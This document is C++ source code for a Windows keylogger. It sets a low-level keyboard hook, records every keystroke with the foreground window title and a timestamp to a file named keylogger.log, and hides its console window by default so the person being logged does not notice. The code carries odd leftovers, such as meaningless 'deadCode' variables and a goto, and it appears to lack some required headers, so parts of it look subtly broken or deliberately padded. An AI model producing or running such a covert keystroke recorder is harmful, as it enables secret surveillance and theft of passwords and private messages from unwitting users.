#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <sstream>
#include <time.h>
#include <deque>

#define hide // (hide / show)
#define FORMAT 0
#define mouseignore

#if FORMAT == 0
std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" }
};

auto keyname_init = []() -> std::map<int, std::string> {
    keyname[VK_RETURN] = "\n";
    keyname[VK_SPACE] = "_";
    keyname[VK_TAB] = "[TAB]";
    keyname[VK_SHIFT] = "[SHIFT]";
    keyname[VK_LSHIFT] = "[LSHIFT]";
    keyname[VK_RSHIFT] = "[RSHIFT]";
    keyname[VK_CONTROL] = "[CONTROL]";
    keyname[VK_LCONTROL] = "[LCONTROL]";
    keyname[VK_RCONTROL] = "[RCONTROL]";
    keyname[VK_MENU] = "[ALT]";
    keyname[VK_LWIN] = "[LWIN]";
    keyname[VK_RWIN] = "[RWIN]";
    keyname[VK_ESCAPE] = "[ESCAPE]";
    keyname[VK_END] = "[END]";
    keyname[VK_HOME] = "[HOME]";
    keyname[VK_LEFT] = "[LEFT]";
    keyname[VK_RIGHT] = "[RIGHT]";
    keyname[VK_UP] = "[UP]";
    keyname[VK_DOWN] = "[DOWN]";
    keyname[VK_PRIOR] = "[PG_UP]";
    keyname[VK_NEXT] = "[PG_DOWN]";
    keyname[VK_OEM_PERIOD] = ".";
    keyname[VK_DECIMAL] = ".";
    keyname[VK_OEM_PLUS] = "+";
    keyname[VK_OEM_MINUS] = "-";
    keyname[VK_ADD] = "+";
    keyname[VK_SUBTRACT] = "-";
    keyname[VK_CAPITAL] = "[CAPSLOCK]";
    return keyname;
}();
#endif

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;
bool ishookset = false;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (!ishookset) {
        return 0;
    }
	if (nCode >= 0 && wParam == WM_KEYDOWN)
	{
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbdStruct.vkCode);
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))
	{
		ishookset = true;
	} else {
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
    ishookset = false;
}

int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}
    if (key_stroke == 1) {
        goto end;
    }
	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}
    end:
    int deadCode = 0;
    deadCode++;

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}
void Stealth()
{
#ifdef hide
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // hide window
#endif

#ifdef show
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // show window
#endif
}

int main()
{
	auto deadCode = []() -> bool{return true;}();
	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	Stealth();

	SetHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	ReleaseHook();
}
